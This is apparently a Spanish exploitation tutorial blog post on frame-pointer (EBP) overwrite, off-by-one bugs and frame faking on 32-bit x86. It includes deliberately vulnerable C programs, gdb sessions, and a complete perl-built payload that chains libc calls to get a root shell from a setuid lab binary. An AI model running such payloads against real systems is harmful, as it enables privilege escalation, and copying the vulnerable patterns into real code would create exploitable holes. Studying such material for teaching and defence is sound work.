---
layout: es/blog-detail
comments: true
title: "Partiendo (de) la base: Ataques al base/frame pointer (EBP)"
date: 2018-07-21T19:59:00+00:00
categories:
    - Exploiting
tags:
    - 32 bit
    - 32 bit
    - buffer overflow
    - buffer overflow
    - exploit
    - exploit
    - exploitiing
    - exploitiing
    - falseo frames
    - falseo frames
    - frame faking
    - frame faking
    - frame pointer overwrite
    - frame pointer overwrite
    - off-by-one
    - off-by-one
    - x86
    - x86
image_src: /assets/uploads/2018/07/puffinsecurity-partiendo-la-base-exploiting-ciberseguridad-e1563962687874.jpg
image_height: 300
image_width: 450
author: Yago Gutierrez
description: Buenas tardes, noches, o lo que corresponda. Por fin llega el esperado(¿?) episodio sobre ataques al base/frame pointer (EBP). Sin más preámbulos, demos comienzo a la función, sí, con doble sentido XDD (¿¿¿esto no es en sí otro preámbulo también???, en fin, ambulemos). Hasta ahora...
publish_time: 2018-07-21T19:59:00+00:00
modified_time: 2019-02-19T14:36:10+00:00
comments_value: 0
---
Buenas tardes, noches, o lo que corresponda. Por fin llega el esperado(¿?) episodio sobre ataques al base/frame pointer (EBP).  
Sin más preámbulos, demos comienzo a la función, sí, con doble sentido XDD (¿¿¿esto no es en sí otro preámbulo también???, en fin, ambulemos).

Hasta ahora hemos estudiado la sobrescritura del EIP(s) para que una posterior instrucción `ret` nos convierta en señor y amo del proceso.

Sin embargo, no siempre se tiene esta oportunidad y es necesario mancharse un poco más las manos. En ocasiones un programa solo permite la sobrescritura total o parcial del `EBP(s)`, el EBP guardado durante el prólogo de función.

Aclarar que esta técnica es aplicable solo a programas/funciones que no tienen omitido el uso del frame pointer (compilados sin la opción de gcc `--fomit-frame-pointer`).

Que yo personalmente conozca, donde por primera vez se describen este tipo de ataques es en el artículo [The Frame Pointer Overwrite](http://phrack.org/issues/55/8.html), de Phrack (de dónde si no…). En el mismo se presenta este código como explotable mediante esta técnica.  

#include <stdio.h>

func(char \*sm)  
{  
char buffer\[256\];  
int i;  
for(i=0;i<=256;i++)  
buffer\[i\]=sm\[i\];  
}

main(int argc, char \*argv\[\])  
{  
if (argc < 2) {  
printf(«missing argsn»);  
exit(-1);  
}

func(argv\[1\]);  
}

La vulnerabilidad en el código es, y espero que la mayor parte de la gente lo haya visto ya, que en el campo de condición en el `for` se emplea un `<=` en lugar de un `<`. Esto produce que en lugar de copiar 256 bytes se copien 257, lo que, al ser el buffer de 256 bytes, permite sobrescribir el último byte de `EBP(s)`. Este tipo de vulnerabilidad tiene el logotipo de _**off-by-one**_. Es similar a un típico error psicológico que lleva a pensar que para dividir un espacio en 10 partes es necesario emplear 10 varillas, cuando en realidad se requieren 9:  

   |   |   |   |   |   |   |   |   |
 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10
   |   |   |   |   |   |   |   |   |
   1   2   3   4   5   6   7   8   9

Si tú eres de los que hubiesen dado la respuesta incorrecta, no pasa nada, algunos en el mundo son más especiales que otros, y tú eres de esos. No es nada malo, es… diferente.  
Bien, una vez aclarado que no debe afectarte a la autoestima, prosigamos. (Por cierto, el nombre con el que se llama este error tan común es [_fencepost error_](https://en.wikipedia.org/wiki/Off-by-one_error#Fencepost_error), y existen diversas variantes).

Pero antes de comenzar tenemos un problemita, hoy en día los compiladores (al menos gcc) sitúan los búferes al final del stack (precisamente como medida de seguridad), de forma que, en nuestro caso, al compilarlo con gcc, se sitúa la variable `i` entre nuestro búfer y `EBP(s)`. Vamos pues a modificarlo un poco para poner en práctica la técnica de hoy, pero primero estudiaremos la diferencia que la hace explotable (si bien puede darse en otras situaciones del mundo real, no es necesaria esta modificación necesariamente).

0804843b <func>:
 804843b: 55                    push   %ebp
 804843c: 89 e5                 mov    %esp,%ebp
 804843e: 81 ec 10 01 00 00     sub    $0x110,%esp
 8048444: c7 45 fc 00 00 00 00  movl   $0x0,-0x4(%ebp)
 804844b: eb 1c                 jmp    8048469 <func+0x2e>

Desensamblado para el código generado con `gcc -fno-stack-protector -no-pie -fno-pie -fno-pic -m32 -D_FORTIFY_SOURCE=0` sobre el código de Klog (el del artículo de Phrack).  
Se aprecia cómo tras el prólogo se hacen 0 los cuatro bytes inferiores al `EBP(s)` (`movl $0x0, -0x4(%ebp)`), ese espacio corresponde a `i`. A continuación se inicia el bucle con la instrucción `jmp`.

Código modificado  

#include <stdio.h>
#include <stdlib.h>

void func(char \*sm)  
{  
char buffer\[256\];  
volatile int i;  
for(i = 0; i <= 256; i++)  
buffer\[i\] = sm\[i\];  
return;  
}

int main(int argc, char\*\* argv)  
{  
if (argc < 2)  
{  
printf(«Missing argsn»);  
return -1;  
}

func(argv\[1\]);

return 0;  
}

He incluido algunas modificaciones que suponen buen gusto y buenas prácticas, además no me gusta tampoco ver que el compilador muestre warnings. De estas modificaciones la única que debería afectar al comportamiento del programa (exceptuando los `return`‘s) es la palabra clave `volatile`. Si quieres saber exactamente qué hace esa palabra clave, este no es un manual de C, ya deberías saber C antes de venir aquí, así que fuera o te echo a los perros.  

0804843b <func>:
 804843b: 55                    push   ebp
 804843c: 89 e5                 mov    ebp,esp
 804843e: 81 ec 10 01 00 00     sub    esp,0x110
 8048444: c7 85 fc fe ff ff 00  mov    DWORD PTR \[ebp-0x104\],0x0
 804844b: 00 00 00 
 804844e: eb 2c                 jmp    804847c <func+0x41>

Desensamblado para el código ya modificado, mismo comando de gcc que el anterior (este en sintaxis Intel porque la variedad es buena).  
Ahora se hace 0x00000000 un espacio que está mucho más abajo del `EBP(s)` (`mov DWORD PTR [ebp-0x104],0x0`), ya que ahora se encuentra la variable `i` tras el buffer. Observemos que en ambos casos el marco del stack es del mismo tamaño exactamente (`sub esp,0x110`).

Vamos a ver cómo la modificación del EBP guardado nos otorga el control del programa.  
Al final de la función, durante el epílogo, encontramos una instrucción `leave`, que equivale a un `mov esp, ebp ; pop ebp`, lo que situaría en el EBP el valor que hemos situado donde el EBP guardado. Se ejecuta un `ret` y se regresa a la función _caller_, a la hora de llegar al `leave` de esta función se pasará del EBP al ESP el valor que hemos situado en EBP, finalmente se ejecutará un `ret`, que equivale a un supuesto `pop eip`, es decir, que colocará en el _instruction pointer_ el valor que contiene la dirección a la que apunta ESP (el cual controlamos nosotros). Si hacemos que ESP apunte a una dirección que contiene datos proporcionados por nosotros. podremos situar en EIP un valor arbitrario. Debemos tener en cuenta que entre el `leave` y el `ret` (del _caller_) puede haber más instrucciones, especialmente `pop`‘s, que aumenten o disminuyan (esto último tachado porque es muy improbable, recordemos que es el final de una función y que se está deshaciendo el marco de pila) el valor de ESP; de hecho, el `leave` mismo contiene un `pop ebp`, lo que nos obliga a situar un valor de al menos 4 bytes menor al que nos interesa (ya que el susodicho `pop` lo aumentará en esos 4 bytes). Y es de hecho aquí donde con mayor seguridad vemos las ventajas que a los ojos de un (¿)supuesto(?) atacante ofrece el _**little endian**_, y es que al estar situado el último byte más cerca del buffer en el stack, nos permite manejarlo como un offset, mientras que en una plataforma _big endian_ podríamos sobrescribir el byte de mayor peso, lo que haría que se nos fuese el ESP de bares, muy lejos de nuestra fruta, ya que todo el stack se encuentra encuadrado en direcciones que comparten los dos primeros bytes, lo que haría un imposible el _off-by-one_. Por eso, al menos cuando se explota un _off-by-one_, nos interesa un sistema _little endian_.

Peeero… Tenemos otro problema más, y es que, como ya vimos hace tiempo, la función `main()` es algo especial, o al menos eso piensan los compiladores, y por eso usan su stack como les parece, convirtiéndolo en un batiburrillo de punteros y valores de registros guardados, esto no lo hace inexplotable, de hecho en este caso, con gcc versión `6.3.0 20170516` (por un problema con el gnome de mi archlinux he tenido que moverme temporalmente a debian stretch hasta que se arregle, por eso tengo una versión de hace más de un año, es el repositorio _stable_) termina permitiéndonos modificar el ESP completo, pero como queremos explotar un _off-by-one_ solo nos debería permitir modificar el último byte. Así que vamos a cambiar el programita una vez más. Sí, lo sé.

#include <stdio.h>
#include <stdlib.h>

void f2(char \*sm)  
{  
char buffer\[256\];  
volatile int i;  
for(i = 0; i <= 256; i++)  
buffer\[i\] = sm\[i\];  
return;  
}

void f1(char\* arg)  
{  
f2(arg);  
return;  
}

int main(int argc, char \*argv\[\])  
{  
if (argc < 2)  
{  
printf(«missing argsn»);  
exit(-1);  
}

f1(argv\[1\]);

return 0;  
}

Vale, vamos a empuñar nuestro mejor acero (ejem**gdb**) y comencemos colocando breakpoints en los puntos interesantes.  

$ gdb -q a
Reading symbols from a...(no debugging symbols found)...done.
(gdb) disas f2
Dump of assembler code for function f2:
   0x0804843b <+0>:  push   %ebp
   0x0804843c <+1>:  mov    %esp,%ebp
   0x0804843e <+3>:  sub    $0x110,%esp
   0x08048444 <+9>:  movl   $0x0,-0x104(%ebp)
   0x0804844e <+19>: jmp    0x804847c <f2+65>
   0x08048450 <+21>: mov    -0x104(%ebp),%eax
   0x08048456 <+27>: mov    -0x104(%ebp),%edx
   0x0804845c <+33>: mov    %edx,%ecx
   0x0804845e <+35>: mov    0x8(%ebp),%edx
   0x08048461 <+38>: add    %ecx,%edx
   0x08048463 <+40>: movzbl (%edx),%edx
   0x08048466 <+43>: mov    %dl,-0x100(%ebp,%eax,1)
   0x0804846d <+50>: mov    -0x104(%ebp),%eax
   0x08048473 <+56>: add    $0x1,%eax
   0x08048476 <+59>: mov    %eax,-0x104(%ebp)
   0x0804847c <+65>: mov    -0x104(%ebp),%eax
   0x08048482 <+71>: cmp    $0x100,%eax
   0x08048487 <+76>: jle    0x8048450 <f2+21>
   0x08048489 <+78>: nop
   0x0804848a <+79>: leave  
   0x0804848b <+80>: ret    
End of assembler dump.
(gdb) disas f1
Dump of assembler code for function f1:
   0x0804848c <+0>:  push   %ebp
   0x0804848d <+1>:  mov    %esp,%ebp
   0x0804848f <+3>:  pushl  0x8(%ebp)
   0x08048492 <+6>:  call   0x804843b <f2>
   0x08048497 <+11>: add    $0x4,%esp
   0x0804849a <+14>: nop
   0x0804849b <+15>: leave  
   0x0804849c <+16>: ret    
End of assembler dump.
(gdb) br f2
Breakpoint 1 at 0x8048444
(gdb) br \*f2+79
Breakpoint 2 at 0x804848a
(gdb) br \*f1+15
Breakpoint 3 at 0x804849b
(gdb) display /i $pc
1: x/i $pc
<error: No registers.>
(gdb)

Ahora analicemos las distintas situaciones.  

(gdb) run \`perl -e 'print "A"x256 . "X"'\`
Starting program: /home/arget/a \`perl -e 'print "A"x256 . "X"'\`

Breakpoint 1, 0x08048444 in f2 ()  
1: x/i $pc  
\=> 0x8048444 <f2+9>: movl $0x0,-0x104(%ebp)  
(gdb)

Le hemos introducido 256 bytes ‘A’ y un byte ‘X’. No importaría introducir más caracteres, únicamente se sobrescribirá el último byte de ebp, ya que el número de bytes que se copian es una constante: 257.  

(gdb) x $ebp
0xffffd23c: 0xffffd248
(gdb)

Ahora vemos que `EBP(s)` vale 0xffffd248. Veamos qué ocurre tras el bucle.  

(gdb) c
Continuing.

Breakpoint 2, 0x0804848a in f2 ()  
1: x/i $pc  
\=> 0x804848a <f2+79>: leave  
(gdb) x $ebp  
0xffffd23c: 0xffffd258  
(gdb)

Justo antes del `leave`, `EBP(s)` vale `0xffffd258`, siendo 0x58 el valor de ‘X’, se demuestra que hemos sobrescrito el último byte.  

(gdb) i r ebp esp
ebp            0xffffd23c 0xffffd23c
esp            0xffffd12c 0xffffd12c
(gdb) nexti
0x0804848b in f2 ()
1: x/i $pc
=> 0x804848b <f2+80>: ret    
(gdb) i r ebp esp
ebp            0xffffd258 0xffffd258
esp            0xffffd240 0xffffd240
(gdb)

Vemos ahora cómo la ejecución del `leave` coloca en EBP nuestro pequeño valorcito. Continuemos al `leave` de la función _caller_ (`f1()`), el punto crítico.

(gdb) c
Continuing.

Breakpoint 3, 0x0804849b in f1 ()  
1: x/i $pc  
\=> 0x804849b <f1+15>: leave  
(gdb) i r ebp esp  
ebp 0xffffd258 0xffffd258  
esp 0xffffd248 0xffffd248  
(gdb) nexti  
0x0804849c in f1 ()  
1: x/i $pc  
\=> 0x804849c <f1+16>: ret  
(gdb) i r ebp esp  
ebp 0xffffd320 0xffffd320  
esp 0xffffd25c 0xffffd25c  
(gdb)

Pues bien, terminamos con 0x5c en el byte de menor peso del ESP, que, por casualidad (claro), es `0x58 + 4`, tal y como podíamos prever (ya que el `pop ebp` dentro del `leave` incrementa el ESP en 4 bytes).  
Ahora, el `ret` recogerá lo que sea que contiene la dirección a la que apunta ESP, que es, por casualidad (ahora sin ironía), 0x08048511, que cae en `__libc_csu_init()`, así que se retorna a `__libc_csu_init()` cuando en realidad el programa debería retornar a `main()`.  

(gdb) x $esp
0xffffd25c: 0x08048511
(gdb) nexti
0x08048511 in \_\_libc\_csu\_init ()
1: x/i $pc
=> 0x8048511 <\_\_libc\_csu\_init+33>: lea    -0xf8(%ebx),%eax
(gdb)

Demostramos así que al colocar en el EBP guardado una dirección arbitraria obtendremos el control de EIP al segundo `leave;ret` que se ejecute, la condición es situar en el EBP guardado una dirección que apunte a nuestra fruta. Nótese que esto por lo general es únicamente viable si se encuentra en un sistema sin ASLR, ya que tampoco contamos en esta fase del ataque con la posibilidad para realizar ataques más complejos, _aka_ ROP, y para más inri, jugamos en el patio de recreo más resbaladizo del mundo: el stack. Por otra parte, sin ASLR sí que tenemos la capacidad para roppear, ya que ESP apunta a nuestra fruta, y tenemos tanto espacio como haya hasta el `EBP(s)`. Sin embargo, ya veremos una especie de ROP llamada _frame faking_ que puede ser más útil en ciertas ocasiones.

En fin, nadie nos prohíbe practicar, ¿no?

``(gdb) run `perl -e 'print "A"x208 . "x10x83x04x08" . "AAAA" . "x05" . "A"x39 . "x08"'`  
Starting program: /home/arget/a `perl -e 'print "A"x208 . "x10x83x04x08" . "AAAA" . "x05" . "A"x39 . "x08"'`  
[Inferior 1 (process 4233) exited with code 05]``

Simplemente se llama a la función exit() desde la plt, con el argumento 0x41414105, pero, como ya hemos visto, exit() devuelve como valor de retorno del programa solo el último byte de su argumento, por eso gdb nos indica que ha salido con valor 05, demostrando una explotación exitosa, francamente sencilla (<2 minutos xd).

Se puede ver que el valor que sobrescribe en `EBP(s)` es 0x08, para aumentarse en 4 y llegar a 0x0c (el valor que he elegido, por el motivo que ahora describiré). Esto se debe a que el `EBP(s)` contiene como tres primeros bytes 0xffffd2.., mientras que nuestra fruta comienza con 0xffffd1.., aunque mirando direcciones arriba en nuestra fruta, vemos que parte de la fruta (60 bytes ni más ni menos) se encuentran también en 0xffffd2.. . Dentro de esas direcciones que tienen como penúltimo byte 0xd2 que apuntan a nuestra fruta, he cogido un offset cualquiera que no sea 0x00: 0x0c. Voy a ser sincero, he cogido el offset menor cuya dirección se veía claramente en gdb sin necesidad de sumar, pero habría valido usar el offset 0x01 −si bien es recomendable que se mantenga la alineación con 0xf, así que sería mejor emplear 0x4 (o 0x00, pero es un byte nulo :$ )−. Tras calcular en qué parte de nuestra fruta queda esa dirección (`0xffffd20c`), colocamos ahí la dirección que queremos que se sitúe en el EIP, y, como si de un ROP se tratase, podemos encadenar funciones falseando más frames utilizando como gadget un `leave;ret`. Esta técnica tiene un nombre, _**frame faking**_, o falseo de frames marcos.

_**Frame Faking**: Cuando te cargas un cuadro y lo arreglas como puedes, a ver si cuela (y si no, me la…)_

Esta técnica (descrita en un interesantísimo artículo de… no, no lo voy a decir otra vez, [The advanced return-into-lib(c) exploits: PaX case study](http://phrack.org/issues/58/4.html) de Nergal) es simplemente otra forma de efectuar un ROPchain, quizá algo más complicada, pero puede ser de utilidad, especialmente cuando no se tiene la posibilidad de escribir más allá del `EIP(s)`, o si no se dispone de gadgets que permitan saltar los argumentos de una función que es necesario llamar.

Aquí explotaremos un programa que nos permitirá sobrescribir hasta `EIP(s)`, ya que ya hemos visto un _off-by-one_, sin embargo también es posible explotar esta técnica en programas que permiten solo sobrescribir el EBP, total o parcialmente, el caso es obtener el control de ESP.  

#include <stdio.h>
#include <string.h>

char\* get\_ebp()  
{  
asm(«mov (%ebp), %eax»);  
}

void func(char \*p)  
{  
char buffer\[128\];  
volatile int i;

/\* i almacena la distancia desde el comienzo del buffer hasta EIP(s) incluido \*/  
i = get\_ebp() – buffer + 4 + 4;

strncpy(buffer, p, i);  
return;  
}

int main(int argc, char\*\* argv)  
{  
if (argc < 2)  
{  
printf(«Missing argsn»);  
return -1;  
}  
func(argv\[1\]);  
return 0;  
}

Venga, me preparo para hacer un gráfico ASCII de estos preciosos  
Nótese que el leave primero mueve de EBP a ESP, de forma que el `pop ebp` recogerá en EBP el valor del sitio al que apunta ahora ESP. Por eso el segundo valor que quedará en EBP se encuentra al comienzo del buffer, ya que el primer `leave` (el que pisa `EIP(s)`) moverá primero a ESP la dirección de buffer, por tanto el posterior `pop ebp` dentro del `leave` recogerá en EBP lo que contiene el comienzo de buffer. Este juego es el que se mantiene a lo largo de toda la explotación.  

Nota: Las direcciones que se emplean aquí son falsas,
 no siguen un esquema real siquiera.

Direcciones altas  
+——————-+  
| &leave;ret | EIP(s) (colocará el 1er EBP falso en ESP y recogerá en EBP el 2do EBP falso)  
+——————-+  
| &buffer | EBP(s) (primer EBP falso)  
+——————-+ <- EBP (inicialmente)  
| … | Espacio extra, ya conocemos los compiladores: más relleno (8 bytes)  
+——————-+  
| Relleno (8 bytes) |  
+——————-+  
| Relleno | Argumento para exit(), nos da un poco igual el valor de retorno del programa  
+——————-+  
| &»/bin/sh» | Argumento para system()  
+——————-+  
| &exit() | Terminamos limpiamente, no perdamos tras la última pirueta el equilibrio  
+——————-+  
| &system() | Ejecutamos al fin nuestro ejercicio estrella  
+——————-+  
| 0xffffd1ff | Séptimo EBP falso, de aquí a falsificar billetes  
+——————-+ <- 0xffffd1ee  
| Relleno | Argumento para setuid(), aquí han estado escribiendo 0x00’s los strcpy’s  
+——————-+ <- 0xffffaaaa/bb/cc/dd  
| &leave;ret | (ESP = 0xffffd1ee, EBP = 0xffffd1ff)  
+——————-+  
| &setuid() |  
+——————-+  
| 0xffffd1ee | Sexto EBP falso, se relame el leave tras el 4rto strcpy  
+——————-+ <- 0xffffd1dd  
| &(0x00) | (segundo arg para strcpy())  
+——————-+  
| 0xffffaadd | (primer arg para strcpy())  
+——————-+  
| &leave;ret | (ESP = 0xffffd1dd, EBP = 0xffffd1ee)  
+——————-+  
| &strcpy() | Cuarto strcpy() (y último, al fin eh)  
+——————-+  
| 0xffffd1dd | Quinto EBP falso, es la cena del leave tras 3er strcpy  
+——————-+ <- 0xffffd1cc  
| &(0x00) | (segundo arg para strcpy())  
+——————-+  
| 0xffffaacc | (primer arg para strcpy())  
+——————-+  
| &leave;ret | (ESP = 0xffffd1cc, EBP = 0xffffd1dd)  
+——————-+  
| &strcpy() | Tercer strcpy()  
+——————-+  
| 0xffffd1cc | Cuarto EBP falso, se lo come el leave tras 2do strcpy  
+——————-+ <- 0xffffd1bb  
| &(0x00) | (segundo arg para strcpy())  
+——————-+  
| 0xffffaabb | (primer arg para strcpy())  
+——————-+  
| &leave;ret | (pondrá 0xffffd1bb en ESP, 0xffffd1cc en EBP)  
+——————-+  
| &strcpy() | Segundo strcpy()  
+——————-+  
| 0xffffd1bb | Tercer EBP falso, esto lo recogerá en EBP el leave tras el 1er strcpy  
+——————-+ <- 0xffffd1aa  
| &(0x00) | (segundo arg —source— para strcpy())  
+——————-+  
| 0xffffaaaa | (primer arg —dest— para strcpy())  
+——————-+  
| &leave;ret | (pondrá 0xffffd1aa en ESP, luego se ejecutará el pop ebp en esa dirección, EBP = 0xffffd1bb)  
+——————-+  
| &strcpy() | 1er strcpy. Esto lo recogerá el ret de nuestro primer gadget  
+——————-+  
| 0xffffd1aa | Segundo EBP falso, lo recogerá el leave que pisa EIP(s)  
+——————-+ <- buffer (128 bytes)  
| … |  
+——————-+ <- ESP (inicialmente)  
Direcciones bajas

Básicamente es volver tan locos a los registros ESP y EBP como se pueda, al final quedan los pobres más desorientados que una brújula en una lavadora, pero para eso estamos nosotros aquí, somos una luz en medio de su oscuridad.  
Hay que tener en cuenta que seguramente se requiera más espacio que para un ROP normal. En nuestro caso hemos ocupado 120 bytes.

Bien, obtenemos las direcciones (en gdb no olvidar `unset environment LINES` y `unset environment COLUMNS`) y sustituimos en el esqueleto que hemos montado previamente. Sabiendo que:  
0xf7e776a0 <strcpy> (gdb)

0xf7eb3d60 <setuid> (gdb)  
0xf7e30800 <exit> nope (byte 0x00 y dirs anteriores no valen) -> 0xf7eb35c5 <\_exit> (gdb ambas)

0x08048484 <+64>: leave  
0x08048485 <+65>: ret (gdb)

80482fc: 00 (objdump)  
0xf7f5ecc8 : /bin/sh (ROPgadget)

y &buffer = 0xffffd240 (gdb)

El problema es que esa dirección de strcpy() (obtenida en gdb mediante `p strcpy`) por algún motivo no hacía nada, es decir, estando los argumentos `dest` y `source` correctos, siendo el primero escribible y el segundo legible, no modificaba nada, es decir, el byte 0x00 que debía copiarse en la dirección `dest`, no era copiado, y no era problema de permisos de direcciones ya que habría dado SIGFAULT o SIGILL, pero la ejecución continuaba perfectamente, de hecho se obtenía shell, solo que el setuid que se ejecutaba recibía como argumento el relleno que situábamos en su argumento, impidiendo obtener el root.

Imaginé que sería algún tema interno del libc, que, a la hora de compilar, las directivas de preprocesador determinan una función strcpy() u otra (existen varias versiones de algunas funciones), si bien finalmente creo que el problema es otro.

El caso es que para determinar a dónde llama un programa compilado con gcc en mi máquina cuando quiere acceder a strcpy(), hago un programita que nos ayudará a ello.  

$ cat b.c
#include <stdio.h>
#include <string.h>

int main()  
{  
char a\[\] = «asd»;  
char b\[4\];  
strcpy(b, a);  
return 0;  
}

$ gdb -q b  
Reading symbols from b…(no debugging symbols found)…done.  
(gdb) disas main  
Dump of assembler code for function main:  
0x0804840b <+0>: lea 0x4(%esp),%ecx  
0x0804840f <+4>: and $0xfffffff0,%esp  
0x08048412 <+7>: pushl -0x4(%ecx)  
0x08048415 <+10>: push %ebp  
0x08048416 <+11>: mov %esp,%ebp  
0x08048418 <+13>: push %ecx  
0x08048419 <+14>: sub $0x14,%esp  
0x0804841c <+17>: movl $0x647361,-0xc(%ebp)  
0x08048423 <+24>: sub $0x8,%esp  
0x08048426 <+27>: lea -0xc(%ebp),%eax  
0x08048429 <+30>: push %eax  
0x0804842a <+31>: lea -0x10(%ebp),%eax  
0x0804842d <+34>: push %eax  
0x0804842e <+35>: call 0x80482e0 <strcpy@plt>  
0x08048433 <+40>: add $0x10,%esp  
0x08048436 <+43>: mov $0x0,%eax  
0x0804843b <+48>: mov -0x4(%ebp),%ecx  
0x0804843e <+51>: leave  
0x0804843f <+52>: lea -0x4(%ecx),%esp  
0x08048442 <+55>: ret  
End of assembler dump.  
(gdb) br \*main +40  
Breakpoint 1 at 0x8048433  
(gdb) run  
Starting program: /home/arget/b

Breakpoint 1, 0x08048433 in main ()  
(gdb) x/i 0080482e0  
0x13a62: Cannot access memory at address 0x13a62  
(gdb) x/i 0x80482e0  
0x80482e0 <strcpy@plt>: jmp \*0x804a00c  
(gdb) x/wx 0x0804a00c  
0x804a00c: 0xf7e89420  
(gdb)

Pues ya vemos a dónde se llama realmente cuando se ejecuta un strcpy(). Lo mejor es que ningún símbolo cubre dicha función:  
`(gdb) disas 0xf7e89420  
No function contains specified address.`  
Vamos a ver al menos cuál es la primera dirección  

(gdb) x/i 0xf7e89420
   0xf7e89420: mov    0x4(%esp),%edx

Vamos a ver en qué dirección se debería situar esta función en el programa vuln. Sin embargo no es necesario hacerlo, ya que la librería se carga en la misma dirección para ambos programas:  

$ ldd b | grep libc
 libc.so.6 => /lib32/libc.so.6 (0xf7e02000)
$ ldd vuln | grep libc
 libc.so.6 => /lib32/libc.so.6 (0xf7e02000)

Sin embargo podemos comprobarlo, solo para demostrarlo.  
Si en el programa b la función se encuentra en 0xf7e89420 y la librería se carga en 0xf7e02000, el offset de la función dentro de la librería es `0xf7e89420 - 0xf7e02000 = 0x87420`. Podemos comprobarlo fácilmente:  
`$ objdump -d /lib32/libc.so.6 | grep 87420  
87420: 8b 54 24 04 mov 0x4(%esp),%edx`

En efecto, es la misma instrucción que vemos en el programa b que se encuentra en la dirección 0xf7e89420. Ahora este offset se lo sumamos a la dirección en la que se carga la librería para el programa vuln, que, como vemos con `ldd`, es 0xf7e02000. `0x87420 + 0xf7e02000 = 0xf7e89420`. QUe resulta ser la misma dirección que hemos visto en b (qué sorpresa, `a + b - b = a`, si es que te lo he dicho, pero tú ni caso). Vamos a hacer la última comprobación:  

$ gdb -q vuln
Reading symbols from vuln...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0x8048494
Starting program: /home/arget/vuln

Temporary breakpoint 1, 0x08048494 in main ()  
(gdb) x/i 0xf7e89420  
0xf7e89420: mov 0x4(%esp),%edx  
(gdb)

Posyastá. Vamos a explotar.  

$ cat vuln.c
#include <stdio.h>
#include <string.h>

char\* get\_ebp()  
{  
asm(«mov (%ebp), %eax»);  
}

void func(char \*p)  
{  
char buffer\[128\];  
volatile int i;

/\* i almacena la distancia desde el comienzo del buffer hasta EIP(s) incluido \*/  
i = get\_ebp() – buffer + 4 + 4;

strncpy(buffer, p, i);  
return;  
}

int main(int argc, char\*\* argv)  
{  
if (argc < 2)  
{  
printf(«Missing argsn»);  
return -1;  
}  
func(argv\[1\]);  
return 0;  
}  
$ gcc vuln.c -o vuln -m32 -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -no-pie -fno-pie -fno-pic  
$ /home/arget/vuln «\`perl -e ‘print  
«x54xd2xffxff» . «x20x94xe8xf7» . «x84x84x04x08» . «x9cxd2xffxff» . «xfcx82x04x08» .  
«x68xd2xffxff» . «x20x94xe8xf7» . «x84x84x04x08» . «x9dxd2xffxff» . «xfcx82x04x08» .  
«x7cxd2xffxff» . «x20x94xe8xf7» . «x84x84x04x08» . «x9exd2xffxff» . «xfcx82x04x08» .  
«x90xd2xffxff» . «x20x94xe8xf7» . «x84x84x04x08» . «x9fxd2xffxff» . «xfcx82x04x08» .  
«xa0xd2xffxff» . «x60x3dxebxf7» . «x84x84x04x08» .  
«ARGT» . # Este ARGT es el argumento para setuid()  
«xa4xd2xffxff» . «x50xc8xe3xf7» . «xc5x35xebxf7» . «xc8xecxf5xf7» .  
«x01AGT» . # Argumento para exit()  
«C»x20 . # Relleno final  
«x40xd2xffxff» . «x84x84x04x08″‘\`»  
$

\### Baia, guarden la calma ###

$ sudo chown root:root vuln  
\[sudo\] password for arget:  
$ sudo chmod u+s vuln  
$ /home/arget/vuln «\`perl -e ‘print  
«x54xd2xffxff» . «x20x94xe8xf7» . «x84x84x04x08» . «x9cxd2xffxff» . «xfcx82x04x08» .  
«x68xd2xffxff» . «x20x94xe8xf7» . «x84x84x04x08» . «x9dxd2xffxff» . «xfcx82x04x08» .  
«x7cxd2xffxff» . «x20x94xe8xf7» . «x84x84x04x08» . «x9exd2xffxff» . «xfcx82x04x08» .  
«x90xd2xffxff» . «x20x94xe8xf7» . «x84x84x04x08» . «x9fxd2xffxff» . «xfcx82x04x08» .  
«xa0xd2xffxff» . «x60x3dxebxf7» . «x84x84x04x08» .  
«ARGT» . # Este ARGT es el argumento para setuid()  
«xa4xd2xffxff» . «x50xc8xe3xf7» . «xc5x35xebxf7» . «xc8xecxf5xf7» .  
«x01AGT» . # Argumento para exit()  
«C»x20 . # Relleno final  
«x40xd2xffxff» . «x84x84x04x08″‘\`»  
\# whoami  
root  
#

Se aprecia claramente el esquema `EBP falso - strcpy() - &leave;ret - arg1 - arg2`en las primeras 4 líneas. Posteriormente se sigue el esquema `EBP falso - función() - &leave;ret - arg`. para las funciones setuid() y system(). Como exit() no retorna no necesita frame falso. Venga, fin de la función (sí, de nuevo con doble sentido). Esperemos en este epílogo no recoger ningún marco falso. Buenas tardes.

Retomamos el ctf propio. En esta ocasión propongo hallar una manera original de resolver el reto presentado en el post [ret2libc: Disparando con su propia pistola](/es/partiendo-de-la-base-ataques-al-base-frame-pointer-ebp). De este reto ya se han presentado dos soluciones en el post [ROP: En el exploiting y en el amor todo vale](/?p=619) (una en el [solucionario](/?p=619#solucionario-mepreguntosialguienleeraestetipodeurls) y otra en [medio del post](/?p=619#en-medio-del-post)).  
Ahora sí, buenas noches, tardes…